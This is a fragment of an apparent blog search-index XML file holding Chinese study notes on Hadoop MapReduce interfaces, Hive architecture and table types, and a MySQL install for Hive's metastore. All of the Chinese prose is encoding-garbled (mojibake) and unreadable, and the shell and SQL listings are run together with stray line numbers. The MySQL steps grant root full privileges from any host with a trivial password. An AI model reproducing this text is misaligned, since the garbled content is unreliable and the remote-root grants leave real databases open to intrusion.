        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce-ç®€å•æ€»ç»“]]></title>
    <url>%2F2018%2F06%2F12%2FHadoop%2F2-MapReduce%2FMapReduce-%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[MapReduceåœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼ŒåŸºæœ¬ä¸Šä¸€ä¸ªå›ºåŒ–çš„æ¨¡å¼ï¼Œæ²¡æœ‰å¤ªå¤šå¯çµæ´»æ”¹å˜çš„åœ°æ–¹ï¼Œé™¤äº†ä»¥ä¸‹å‡ å¤„ï¼š è¾“å…¥æ•°æ®æ¥å£ï¼šInputFormat FileInputFormat (æ–‡ä»¶ç±»å‹æ•°æ®è¯»å–çš„é€šç”¨æŠ½è±¡ç±») DBInputFormat ï¼ˆæ•°æ®åº“æ•°æ®è¯»å–çš„é€šç”¨æŠ½è±¡ç±»ï¼‰ é»˜è®¤ä½¿ç”¨çš„å®ç°ç±»æ˜¯ï¼š TextInputFormat job.setInputFormatClass(TextInputFormat.class) TextInputFormatçš„åŠŸèƒ½é€»è¾‘æ˜¯ï¼šä¸€æ¬¡è¯»ä¸€è¡Œæ–‡æœ¬ï¼Œç„¶åå°†è¯¥è¡Œçš„èµ·å§‹åç§»é‡ä½œä¸ºkeyï¼Œè¡Œå†…å®¹ä½œä¸ºvalueè¿”å› é€»è¾‘å¤„ç†æ¥å£ï¼š Mapper å®Œå…¨éœ€è¦ç”¨æˆ·è‡ªå·±å»å®ç°å…¶ä¸­ map() setup() clean() mapè¾“å‡ºçš„ç»“æœåœ¨shuffleé˜¶æ®µä¼šè¢«partitionä»¥åŠsortï¼Œæ­¤å¤„æœ‰ä¸¤ä¸ªæ¥å£å¯è‡ªå®šä¹‰ï¼š Partitioner æœ‰é»˜è®¤å®ç° HashPartitionerï¼Œé€»è¾‘æ˜¯æ ¹æ®keyå’ŒnumReducesæ¥è¿”å›ä¸€ä¸ªåˆ†åŒºå·:key.hashCode()&amp;Integer.MAXVALUE % numReduces é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨é»˜è®¤çš„è¿™ä¸ªHashPartitionerå°±å¯ä»¥ï¼Œå¦‚æœä¸šåŠ¡ä¸Šæœ‰ç‰¹åˆ«çš„éœ€æ±‚ï¼Œå¯ä»¥è‡ªå®šä¹‰ ç»§æ‰¿ Partitioner, é‡å†™getPartitionæ–¹æ³•, å…·ä½“è§è¿™é‡Œ Comparable å½“æˆ‘ä»¬ç”¨è‡ªå®šä¹‰çš„å¯¹è±¡ä½œä¸ºkeyæ¥è¾“å‡ºæ—¶ï¼Œå°±å¿…é¡»è¦å®ç°WritableComparableæ¥å£ï¼Œoverrideå…¶ä¸­çš„compareTo()æ–¹æ³•, å…·ä½“è§è¿™é‡Œ reduceç«¯çš„æ•°æ®åˆ†ç»„æ¯”è¾ƒæ¥å£ ï¼š Groupingcomparator reduceTaskæ‹¿åˆ°è¾“å…¥æ•°æ®ï¼ˆä¸€ä¸ªpartitionçš„æ‰€æœ‰æ•°æ®ï¼‰åï¼Œé¦–å…ˆéœ€è¦å¯¹æ•°æ®è¿›è¡Œåˆ†ç»„ï¼Œå…¶åˆ†ç»„çš„é»˜è®¤åŸåˆ™æ˜¯keyç›¸åŒï¼Œç„¶åå¯¹æ¯ä¸€ç»„kvæ•°æ®è°ƒç”¨ä¸€æ¬¡reduce()æ–¹æ³•ï¼Œå¹¶ä¸”å°†è¿™ä¸€ç»„kvä¸­çš„ç¬¬ä¸€ä¸ªkvçš„keyä½œä¸ºå‚æ•°ä¼ ç»™reduceçš„keyï¼Œå°†è¿™ä¸€ç»„æ•°æ®çš„valueçš„è¿­ä»£å™¨ä¼ ç»™reduce()çš„valueså‚æ•° åˆ©ç”¨ä¸Šè¿°è¿™ä¸ªæœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªé«˜æ•ˆçš„åˆ†ç»„å–æœ€å¤§å€¼çš„é€»è¾‘ï¼š è‡ªå®šä¹‰ä¸€ä¸ªbeanå¯¹è±¡ç”¨æ¥å°è£…æˆ‘ä»¬çš„æ•°æ®ï¼Œç„¶åæ”¹å†™å…¶compareToæ–¹æ³•äº§ç”Ÿå€’åºæ’åºçš„æ•ˆæœ ç„¶åè‡ªå®šä¹‰ä¸€ä¸ªGroupingcomparatorï¼Œå°†beanå¯¹è±¡çš„åˆ†ç»„é€»è¾‘æ”¹æˆæŒ‰ç…§æˆ‘ä»¬çš„ä¸šåŠ¡åˆ†ç»„idæ¥åˆ†ç»„ï¼ˆæ¯”å¦‚è®¢å•å·ï¼‰ è¿™æ ·ï¼Œæˆ‘ä»¬è¦å–çš„æœ€å¤§å€¼å°±æ˜¯reduce()æ–¹æ³•ä¸­ä¼ è¿›æ¥key é€»è¾‘å¤„ç†æ¥å£ï¼šReducer å®Œå…¨éœ€è¦ç”¨æˆ·è‡ªå·±å»å®ç°å…¶ä¸­ reduce() setup() clean() è¾“å‡ºæ•°æ®æ¥å£ï¼š OutputFormat æœ‰ä¸€ç³»åˆ—å­ç±» FileOutputformat DBoutputFormat â€¦.. é»˜è®¤å®ç°ç±»æ˜¯TextOutputFormat åŠŸèƒ½é€»è¾‘æ˜¯ï¼š å°†æ¯ä¸€ä¸ªKVå¯¹å‘ç›®æ ‡æ–‡æœ¬æ–‡ä»¶ä¸­è¾“å‡ºä¸ºä¸€è¡Œ â€‹]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hiveå­¦ä¹ -1-å®‰è£…]]></title>
    <url>%2F2018%2F06%2F12%2FHadoop%2F3-Hive%2FHive%E5%AD%A6%E4%B9%A0-1%2F</url>
    <content type="text"><![CDATA[Hiveç®€ä»‹ HiveåŸºæœ¬æƒ…å†µHive æ˜¯å»ºç«‹åœ¨ Hadoop ä¸Šçš„æ•°æ®ä»“åº“åŸºç¡€æ„æ¶ ç”±facebookå¼€æºï¼Œæœ€åˆç”¨äºè§£å†³æµ·é‡ç»“æ„åŒ–çš„æ—¥å¿—æ•°æ®ç»Ÿ è®¡é—®é¢˜; ETL(Extraction-Transformation-Loading)å·¥å…· æ„å»ºåœ¨Hadoopä¹‹ä¸Šçš„æ•°æ®ä»“åº“; æ•°æ®è®¡ç®—ä½¿ç”¨MRï¼Œæ•°æ®å­˜å‚¨ä½¿ç”¨HDFS æ•°æ®åº“&amp;æ•°æ®ä»“åº“ çš„åŒºåˆ«ï¼š æ¦‚å¿µä¸Š æ•°æ®åº“ï¼šç”¨äºç®¡ç†ç²¾ç»†åŒ–æ•°æ®ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç”¨äºå­˜å‚¨ç»“æœæ•°æ®ï¼Œåˆ†åº“åˆ†è¡¨è¿›è¡Œå­˜å‚¨ æ•°æ®ä»“åº“ï¼šå­˜å‚¨ã€æŸ¥è¯¢ã€åˆ†æå¤§è§„æ¨¡æ•°æ® ã€‚æ›´åƒä¸€ä¸ªæ‰“åŒ…çš„è¿‡ç¨‹ï¼Œé‡Œé¢å­˜å‚¨çš„æ•°æ®æ²¡æœ‰ç»†åŒ–åŒºåˆ†ï¼Œç²’åº¦è¾ƒç²— ç”¨é€”ä¸Šï¼š æ•°æ®åº“ï¼šOLTPï¼Œon line Transation Processing è”æœºäº‹åŠ¡å¤„ç†ï¼Œå¢åˆ æ”¹ æ•°æ®ä»“åº“ï¼šOLAPï¼Œon line analysis Processing è”æœºäº‹åŠ¡åˆ†æå¤„ç†ï¼ŒæŸ¥è¯¢ï¼Œhiveä¸æ”¯æŒåˆ é™¤ã€ä¿®æ”¹ã€‚ æ”¯æŒæ’å…¥ã€‚ ä½¿ç”¨ä¸Šï¼š æ•°æ®åº“ï¼šæ ‡å‡†sql, hbase: éæ ‡å‡†sql æ•°æ®ä»“åº“ï¼šæ–¹è¨€ç‰ˆçš„sqlï¼Œ HQL æ¨¡å¼ä¸Šï¼š æ•°æ®åº“ï¼šå†™æ¨¡å¼ æ•°æ®ä»“åº“ï¼šè¯»æ¨¡å¼ å¯ä»¥å°†ç»“æ„åŒ–çš„æ•°æ®æ˜ å°„æˆä¸€å¼ æ•°æ®åº“è¡¨ ç»“æ„åŒ–æ•°æ®æ˜ å°„æˆäºŒç»´è¡¨ å°†æ–‡æœ¬ä¸­æ¯ä¸€è¡Œæ•°æ®æ˜ å°„ä¸ºæ•°æ®åº“çš„æ¯ä¸€æ¡æ•°æ® å°†æ–‡æœ¬ä¸­æ¯ä¸€åˆ—æ•°æ®æ˜ å°„ä¸ºhiveçš„è¡¨å­—æ®µ æä¾›HQL æŸ¥è¯¢åŠŸèƒ½ hive query languageï¼Œ æ–¹è¨€ç‰ˆsql åº•å±‚æ•°æ®æ˜¯å­˜å‚¨åœ¨HDFSä¸Š hiveä¸Šå»ºçš„è¡¨ä»…ä»…ç›¸å½“äºå¯¹hdfsä¸Šçš„ç»“æ„åŒ–æ•°æ®è¿›è¡Œæ˜ å°„ç®¡ç† hiveä»…ä»…æ˜¯ä¸€ä¸ªç®¡ç†æ•°æ®çš„ä½œç”¨ï¼Œè€Œä¸ä¼šå­˜å‚¨æ•°æ® hiveæƒ³è¦ç®¡ç†hdfsä¸Šçš„æ•°æ®ï¼Œå°±è¦å»ºç«‹ä¸€ä¸ªå…³è”å…³ç³»ï¼Œå…³è”hiveä¸Šçš„è¡¨å’Œhdfsä¸Šçš„æ•°æ®è·¯å¾„ æ•°æ®æ˜¯ä¾èµ–äºä¸€ä¸ªå…ƒæ•°æ®åº“ å…ƒæ•°æ®åº“é‡‡ç”¨çš„æ˜¯å…³ç³»å‹æ•°æ®åº“ï¼Œ çœŸå®ç”Ÿäº§ä¸­ä¸€èˆ¬ä½¿ç”¨mysqlä¸ºhiveçš„å…ƒæ•°æ®åº“ï¼Œhiveå†…ç½®é»˜è®¤çš„å…ƒæ•°æ®åº“æ˜¯ derby å…ƒæ•°æ®ï¼š HCalalog hiveä¸­çš„è¡¨å’Œhdfsçš„æ˜ å°„å…³ç³»ï¼Œä»¥åŠhiveè¡¨å±æ€§ï¼ˆå†…éƒ¨è¡¨ï¼Œå¤–éƒ¨è¡¨ï¼Œè§†å›¾ï¼‰å’Œå­—æ®µä¿¡æ¯ å…ƒæ•°æ®ä¸€æ—¦ä¿®é¥°ï¼Œhiveçš„æ‰€æœ‰æ˜ å°„å…³ç³»ç­‰éƒ½æ²¡äº†ï¼Œå°±æ— æ³•ä½¿ç”¨äº† å¯ä¸Pigã€Prestoç­‰å…±äº« Hiveçš„æ˜¯æ„å»ºåœ¨Hadoopä¹‹ä¸Šçš„æ•°æ®ä»“åº“ æ•°æ®è®¡ç®—ä½¿ç”¨MRï¼Œæ•°æ®å­˜å‚¨ä½¿ç”¨HDFS é€šå¸¸ç”¨äºè¿›è¡Œç¦»çº¿æ•°æ®å¤„ç†(é‡‡ç”¨MapReduce) å¯è®¤ä¸ºæ˜¯ä¸€ä¸ªHQLâ€”-&gt;MRçš„è¯­è¨€ç¿»è¯‘å™¨ Hiveä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š ç®€å•ï¼Œå®¹æ˜“ä¸Šæ‰‹ æä¾›äº†ç±»SQLæŸ¥è¯¢è¯­è¨€HQL ä¸ºè¶…å¤§æ•°æ®é›†è®¾è®¡çš„è®¡ç®—/æ‰©å±•èƒ½åŠ› MRä½œä¸ºè®¡ç®—å¼•æ“ï¼ŒHDFSä½œä¸ºå­˜å‚¨ç³»ç»Ÿ ç»Ÿä¸€çš„å…ƒæ•°æ®ç®¡ç†(HCalalog) å¯ä¸Pigã€Prestoç­‰å…±äº« ç¼ºç‚¹ ä¸æ”¯æŒ åˆ é™¤ &amp; ä¿®æ”¹ delete&amp;updateï¼Œä¸æ”¯æŒäº‹åŠ¡ å› ä¸ºæ˜¯åŸºäºHDFS hiveåšçš„æœ€å¤šçš„æ˜¯æŸ¥è¯¢ Hiveçš„HQLè¡¨è¾¾çš„èƒ½åŠ›æœ‰é™ è¿­ä»£å¼ç®—æ³•æ— æ³•è¡¨è¾¾ æœ‰äº›å¤æ‚è¿ç®—ç”¨HQLä¸æ˜“è¡¨è¾¾ Hiveæ•ˆç‡è¾ƒä½ï¼ŒæŸ¥è¯¢å»¶æ—¶é«˜ Hiveè‡ªåŠ¨ç”ŸæˆMapReduceä½œä¸šï¼Œé€šå¸¸ä¸å¤Ÿæ™ºèƒ½ HQLè°ƒä¼˜å›°éš¾ï¼Œç²’åº¦è¾ƒç²— å¯æ§æ€§å·® Hiveä¸ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“(RDBMSï¼‰å¯¹æ¯” Hiveçš„æ¶æ„ 1) ç”¨æˆ·æ¥å£ CLIï¼šCommand Line Interfaceï¼Œå³Shellç»ˆç«¯å‘½ä»¤è¡Œï¼Œä½¿ç”¨ Hive å‘½ä»¤è¡Œä¸ Hive è¿›è¡Œäº¤äº’ï¼Œæœ€å¸¸ç”¨ï¼ˆå­¦ä¹ ï¼Œè°ƒè¯•ï¼Œç”Ÿäº§ï¼‰ï¼ŒåŒ…æ‹¬ä¸¤ç§è¿è¡Œæ–¹å¼ï¼š hiveå‘½ä»¤æ–¹å¼ï¼šå‰æå¿…é¡»åœ¨hiveå®‰è£…èŠ‚ç‚¹ä¸Šæ‰§è¡Œ hiveserver2æ–¹å¼ï¼šhiveå®‰è£…èŠ‚ç‚¹å°†hiveå¯åŠ¨ä¸ºä¸€ä¸ªåå°è¿›ç¨‹ï¼Œå®¢æˆ·æœºè¿›è¡Œè¿æ¥ï¼ˆç±»ä¼¼äºå¯åŠ¨äº†ä¸€ä¸ªhiveæœåŠ¡ç«¯ï¼‰ çœŸå®ç”Ÿäº§ä¸­å¸¸ç”¨ï¼ - 1) ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå…è®¸è¿œç¨‹è¿æ¥; ç¬¬ä¸€ï¼šä¿®æ”¹ hdfs-site.xmlï¼ŒåŠ å…¥ä¸€æ¡é…ç½®ä¿¡æ¯ï¼Œå¯ç”¨ webhdfsï¼› ç¬¬äºŒï¼šä¿®æ”¹ core-site.xmlï¼ŒåŠ å…¥ä¸¤æ¡é…ç½®ä¿¡æ¯ï¼Œè®¾ç½® hadoopçš„ä»£ç†ç”¨æˆ·ã€‚ - 2) å¯åŠ¨æœåŠ¡è¿›ç¨‹ - å‰å°å¯åŠ¨ï¼šhiveserver2 - åå°å¯åŠ¨ - è®°å½•æ—¥å¿—ï¼šnohup hiveserver2 1&gt;/home/sigeon/hiveserver.log 2&gt;/home/sigeon/hiveserver.err &amp; 0ï¼šæ ‡å‡†æ—¥å¿—è¾“å…¥ 1ï¼šæ ‡å‡†æ—¥å¿—è¾“å‡º 2ï¼šé”™è¯¯æ—¥å¿—è¾“å‡º å¦‚æœæˆ‘æ²¡æœ‰é…ç½®æ—¥å¿—çš„è¾“å‡ºè·¯å¾„ï¼Œæ—¥å¿—ä¼šç”Ÿæˆåœ¨å½“å‰å·¥ä½œç›®å½•ï¼Œé»˜è®¤çš„æ—¥å¿—åç§°å«åšï¼š nohup.xxx - ä¸è®°å½•æ—¥å¿—ï¼šnohup hiveserver2 1&gt;/dev/null 2&gt;/dev/null &amp; - [è¡¥å……ï¼š] - nohupå‘½ä»¤ï¼šno hang upçš„ç¼©å†™ï¼Œå³ä¸æŒ‚èµ·ï¼Œå¯ä»¥åœ¨ä½ é€€å‡ºå¸æˆ·/å…³é—­ç»ˆç«¯ä¹‹åç»§ç»­è¿è¡Œç›¸åº”çš„è¿›ç¨‹ã€‚ - è¯­æ³•ï¼šnohup &lt;command&gt; &amp; - 3) å¼€å¯beenlineå®¢æˆ·ç«¯å¹¶è¿æ¥ï¼š - æ–¹æ³•ä¸€ï¼š - beenlineï¼Œå¼€å¯beenlineå®¢æˆ·ç«¯; - !connect jdbc:&lt;hive2://master:10000&gt;ï¼Œå›è½¦ã€‚ç„¶åè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿™ä¸ªç”¨æˆ·åæ˜¯å®‰è£… hadoop é›†ç¾¤çš„ç”¨æˆ·å - æ–¹æ³•äºŒï¼š - beeline -u jdbc:&lt;hive2://master:10000&gt; -n sigeon JDBC/ODBCï¼šæ˜¯ Hive çš„åŸºäº JDBC æ“ä½œæä¾›çš„å®¢æˆ·ç«¯ï¼Œç”¨æˆ·ï¼ˆå¼€å‘å‘˜ï¼Œè¿ç»´äººå‘˜ï¼‰é€šè¿‡ è¿™è¿æ¥è‡³ Hive server æœåŠ¡ Web UIï¼šé€šè¿‡æµè§ˆå™¨è®¿é—® Hiveï¼ŒåŸºæœ¬ä¸ä¼šä½¿ç”¨ 2) å…ƒæ•°æ®åº“ï¼šä¿å­˜å…ƒæ•°æ®ï¼Œä¸€èˆ¬ä¼šé€‰ç”¨å…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚mysqlï¼ŒHive å’Œ MySQL ä¹‹é—´é€šè¿‡ MetaStore æœåŠ¡äº¤äº’ï¼‰ 3) ThriftæœåŠ¡ï¼šFacebook å¼€å‘çš„ä¸€ä¸ªè½¯ä»¶æ¡†æ¶ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œå¯æ‰©å±•ä¸”è·¨è¯­è¨€çš„æœåŠ¡çš„å¼€å‘ï¼Œ Hive é›†æˆäº†è¯¥æœåŠ¡ï¼Œèƒ½è®©ä¸åŒçš„ç¼–ç¨‹è¯­è¨€è°ƒç”¨ Hive çš„æ¥å£ 4) é©±åŠ¨Driver a. è§£é‡Šå™¨ï¼šè§£é‡Šå™¨çš„ä½œç”¨æ˜¯å°† HiveSQL è¯­å¥è½¬æ¢ä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ b. ç¼–è¯‘å™¨ï¼šç¼–è¯‘å™¨æ˜¯å°†è¯­æ³•æ ‘ç¼–è¯‘ä¸ºé€»è¾‘æ‰§è¡Œè®¡åˆ’ c. ä¼˜åŒ–å™¨ï¼šä¼˜åŒ–å™¨æ˜¯å¯¹é€»è¾‘æ‰§è¡Œè®¡åˆ’è¿›è¡Œä¼˜åŒ– d. æ‰§è¡Œå™¨ï¼šæ‰§è¡Œå™¨æ˜¯è°ƒç”¨åº•å±‚çš„è¿è¡Œæ¡†æ¶æ‰§è¡Œé€»è¾‘æ‰§è¡Œè®¡åˆ’ Hiveçš„æ•°æ®ç»„ç»‡æ ¼å¼ 1)åº“ï¼šdatabase 2) è¡¨ a. å†…éƒ¨è¡¨ï¼ˆç®¡ç†è¡¨ï¼šmanaged_tableï¼‰ b. å¤–éƒ¨è¡¨ï¼ˆexternal_tableï¼‰ å†…éƒ¨è¡¨å’Œå¤–éƒ¨è¡¨åŒºåˆ«ï¼š å†…éƒ¨è¡¨å’Œå¤–éƒ¨è¡¨æ˜¯ä¸¤ä¸ªç›¸å¯¹çš„æ¦‚å¿µï¼Œä¸å¯èƒ½æœ‰ä¸€ä¸ªè¡¨åŒæ—¶æ˜¯å†…éƒ¨è¡¨åˆæ˜¯å¤–éƒ¨è¡¨ï¼› å†…éƒ¨è¡¨åˆ é™¤è¡¨çš„æ—¶å€™ä¼šåˆ é™¤åŸå§‹æ•°æ®å’Œå…ƒæ•°æ®ï¼Œè€Œå¤–éƒ¨è¡¨åˆ é™¤è¡¨çš„æ—¶å€™åªä¼šåˆ é™¤å…ƒæ•°æ®ä¸ä¼šåˆ é™¤åŸå§‹æ•°æ® ä¸€èˆ¬æƒ…å†µä¸‹å­˜å‚¨å…¬å…±æ•°æ®çš„è¡¨å­˜æ”¾ä¸ºå¤–éƒ¨è¡¨ å¤§å¤šæ•°æƒ…å†µï¼Œä»–ä»¬çš„åŒºåˆ«ä¸æ˜æ˜¾ã€‚å¦‚æœæ•°æ®çš„æ‰€æœ‰å¤„ç†éƒ½åœ¨ Hive ä¸­è¿›è¡Œï¼Œé‚£ä¹ˆå€¾å‘äº é€‰æ‹©å†…éƒ¨è¡¨ï¼›ä½†æ˜¯å¦‚æœ Hive å’Œå…¶ä»–å·¥å…·è¦é’ˆå¯¹ç›¸åŒçš„æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼Œå¤–éƒ¨è¡¨æ›´åˆé€‚ã€‚ ä½¿ç”¨å¤–éƒ¨è¡¨è®¿é—®å­˜å‚¨åœ¨ HDFS ä¸Šçš„åˆå§‹æ•°æ®ï¼Œç„¶åé€šè¿‡ Hive è½¬æ¢æ•°æ®å¹¶å­˜åˆ°å†…éƒ¨è¡¨ä¸­ï¼Œä½¿ç”¨å¤–éƒ¨è¡¨çš„åœºæ™¯æ˜¯é’ˆå¯¹ä¸€ä¸ªæ•°æ®é›†æœ‰å¤šä¸ªä¸åŒçš„ Schemaã€‚ c. åˆ†åŒºè¡¨ ä¸åŒäºhadoopä¸­çš„åˆ†åŒºï¼Œåˆ†åŒºè¡¨æ˜¯äººä¸ºåˆ’åˆ†çš„ hiveæœ€ç»ˆå­˜å‚¨æµ·é‡æ•°æ®ï¼Œæµ·é‡æ•°æ®æŸ¥è¯¢ä¸€å®šæ³¨æ„é¿å…å…¨è¡¨æ‰«æ æŸ¥è¯¢çš„æ—¶å€™ä¸ºäº†æå‡æˆ‘ä»¬çš„æŸ¥è¯¢æ€§èƒ½ï¼Œå‡ºç°äº†åˆ†åŒºè¡¨ å°†æ•°æ®æŒ‰ç…§ç”¨æˆ·çš„ä¸šåŠ¡å­˜å‚¨åˆ°ä¸åŒçš„ç›®å½•ä¸‹ï¼Œåœ¨è¿›è¡Œæ•°æ®æŸ¥è¯¢æ—¶åªä¼šå¯¹æŒ‡å®šåˆ†åŒºä¸‹çš„æ•°æ®è¿›è¡Œæ‰«æä¸€èˆ¬æƒ…å†µä¸‹ç”Ÿäº§ä¸­ç”¨æ—¥æœŸä½œä¸ºåˆ†åŒºå­—æ®µ d. åˆ†æ¡¶è¡¨ ç±»ä¼¼äºhadoopä¸­çš„åˆ†åŒºï¼Œæ˜¯ç”±ç¨‹åºå†³å®šçš„ï¼Œåªèƒ½æŒ‡å®šæ¡¶çš„ä¸ªæ•°ï¼ˆåˆ†åŒºçš„ä¸ªæ•°ï¼‰ æ ¹æ®hashç®—æ³•å°†ä½™æ•°ä¸åŒçš„è¾“å‡ºåˆ°ä¸åŒçš„æ–‡ä»¶ä¸­ ä½œç”¨ï¼š 1ï¼‰æå‡joinçš„æ€§èƒ½æ€è€ƒè¿™ä¸ªé—®é¢˜ï¼šselect a.id,a.name,b.addr from a join b on a.id = b.id;å¦‚æœ a è¡¨å’Œ b è¡¨å·²ç»æ˜¯ åˆ†æ¡¶è¡¨ï¼Œè€Œä¸”åˆ†æ¡¶çš„å­—æ®µæ˜¯ id å­—æ®µåšè¿™ä¸ª join æ“ä½œæ—¶ï¼Œè¿˜éœ€è¦å…¨è¡¨åšç¬›å¡å°”ç§¯ 2ï¼‰æå‡æ•°æ®æ ·æœ¬çš„æŠ½å–æ•ˆç‡ï¼Œç›´æ¥æ‹¿ä¸€ä¸ªæ¡¶ä¸­çš„æ•°æ®ä½œä¸ºæ ·æœ¬æ•°æ® åˆ†åŒºè¡¨å’Œåˆ†æ¡¶è¡¨çš„åŒºåˆ«ï¼š Hive æ•°æ®è¡¨å¯ä»¥æ ¹æ®æŸäº›å­—æ®µè¿›è¡Œåˆ†åŒºæ“ä½œï¼Œç»†åŒ–æ•°æ®ç®¡ç†ï¼Œå¯ä»¥è®©éƒ¨åˆ†æŸ¥è¯¢æ›´å¿«ã€‚ åŒæ—¶è¡¨å’Œåˆ†åŒºä¹Ÿå¯ä»¥è¿›ä¸€æ­¥è¢«åˆ’åˆ†ä¸º Bucketsï¼Œåˆ†æ¡¶è¡¨çš„åŸç†å’Œ MapReduce ç¼–ç¨‹ä¸­çš„ HashPartitioner çš„åŸç†ç±»ä¼¼ åˆ†åŒºå’Œåˆ†æ¡¶éƒ½æ˜¯ç»†åŒ–æ•°æ®ç®¡ç†ï¼Œä½†æ˜¯åˆ†åŒºè¡¨æ˜¯æ‰‹åŠ¨æ·»åŠ åŒºåˆ†ï¼Œç”±äº Hive æ˜¯è¯»æ¨¡å¼ï¼Œæ‰€ä»¥å¯¹æ·»åŠ è¿›åˆ†åŒºçš„æ•°æ®ä¸åšæ¨¡å¼æ ¡éªŒ åˆ†æ¡¶è¡¨ä¸­çš„æ•°æ®æ˜¯æŒ‰ç…§æŸäº›åˆ†æ¡¶å­—æ®µè¿›è¡Œ hash æ•£åˆ— å½¢æˆçš„å¤šä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ•°æ®çš„å‡†ç¡®æ€§ä¹Ÿé«˜å¾ˆå¤š 3)è§†å›¾ï¼š hiveä¸­çš„è§†å›¾ä»…ä»…ç›¸å½“äºä¸€ä¸ªsqlè¯­å¥çš„åˆ«å åœ¨hiveä¸­ä»…ä»…å­˜åœ¨é€»è¾‘è§†å›¾ï¼Œä¸å­˜åœ¨ç‰©ç†è§†å›¾ ç‰©ç†è§†å›¾ï¼šè®²sqlè¯­å¥çš„æ‰§è¡Œç»“æœå­˜åœ¨è§†å›¾ä¸­ é€»è¾‘è§†å›¾ï¼š ä»…ä»…æ˜¯å¯¹æŸ¥è¯¢ç»“æœçš„å¼•ç”¨ 4)æ•°æ®å­˜å‚¨ï¼š åŸå§‹æ•°æ®ä¸­å­˜åœ¨HDFS å…ƒæ•°æ®å­˜åœ¨mysql Hiveå®‰è£…è£…hiveå…¶å®ä¸éš¾ï¼Œä¸»è¦æ˜¯å®‰è£…mysqlï¼Œè§£å†³mysqlçš„æƒé™é—®é¢˜ MySqlå®‰è£…RPM å®‰è£…MySQlï¼š æ£€æŸ¥ä»¥å‰æ˜¯å¦è£…è¿‡ MySQL 1rpm -qa|grep -i mysql å‘ç°æœ‰çš„è¯å°±éƒ½å¸è½½ 12rpm -e --nodeps mysql-libs-5.1.73-5.el6_6.x86_64rpm -e --nodeps .... åˆ é™¤è€ç‰ˆæœ¬ mysql çš„å¼€å‘å¤´æ–‡ä»¶å’Œåº“ 12rm -rf /usr/lib64/mysql# åœ¨æœç´¢ my.cnf æ–‡ä»¶ï¼Œæœ‰çš„è¯å°±åˆ æ‰ ä¸Šä¼ mysql å®‰è£…åŒ…åˆ° Linuxä¸­ï¼Œè§£å‹ 12345678tar -xvf mysql-5.6.26-1.linux_glibc2.5.x86_64.rpm-bundle.tar# è§£å‹å‡ºæ¥æœ‰è¿™äº›æ–‡ä»¶MySQL-devel-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-embedded-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-shared-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-shared-compat-5.6.26-1.linux_glibc2.5.x86_64.rpmMySQL-test-5.6.26-1.linux_glibc2.5.x86_64.rpm å®‰è£… server &amp; client 1234# serverrpm -ivh MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm# clientrpm -ivh MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpm å¯åŠ¨Mysql 1sudo service mysql start ç™»å½•Mysqlå¹¶æ”¹å¯†ç ï¼Œç­‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# åˆå§‹å¯†ç åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­cat /root/.mysql_sercert # ç™»å½•mysql -uroot -pxxxxx# åˆ é™¤é™¤äº†`%`ä¹‹å¤–çš„å…¶ä»–æ‰€æœ‰hostuse mysql;select host,user,password from user;delete from user where host in (&apos;localhost&apos;, &apos;127.0.0.1&apos;,&apos;::1&apos;, ...)# ä¿®æ”¹å¯†ç  UPDATE user SET Password = PASSWORD(&apos;psd&apos;) WHERE user = &apos;root&apos;;# ä¸º`%` å’Œ `*` æ·»åŠ è¿œç¨‹ç™»å½•æƒé™ #æ³¨æ„ï¼š å‰é¢çš„ mysql ç™»å½•ç”¨æˆ·åï¼Œ 123 æ˜¯ç™»å½•å¯†ç GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;psd&apos; WITH GRANT OPTION;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;*&apos; IDENTIFIED BY &apos;psd&apos; WITH GRANT OPTION;FLUSH PRIVILEGES;# é€€å‡ºç™»å½•exit;# æ­¤æ—¶å¯ä»¥å†ç™»å½•è¯•è¯•mysql -uroot -ppsd======================================# ä¿®æ”¹å­—ç¬¦é›†ä¸º utf-8# æ–°å»ºä¸€ä¸ªæ–‡ä»¶vi /etc/my.cnf # æ·»åŠ ä»¥ä¸‹å†…å®¹[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]character-set-server=utf8# é‡å¯mysqlsudo service mysql restart======================================# å¿˜è®°å¯†ç ï¼Œä¿®æ”¹å¯†ç çš„æ–¹æ³•# åœæ­¢mysqlæœåŠ¡çš„è¿è¡Œservice mysql stop# è·³è¿‡æˆæƒè¡¨è®¿é—®mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp; # ç™»å½•mysqlmysql -u root mysql # æ¥ä¸‹æ¥å¯ä»¥ä¿®æ”¹å¯†ç äº† ##åœ¨mysql5.7ä»¥ä¸‹çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼šmysql&gt; UPDATE user SET Password=PASSWORD(&apos;newpassword&apos;) where USER=&apos;rootâ€™ï¼› 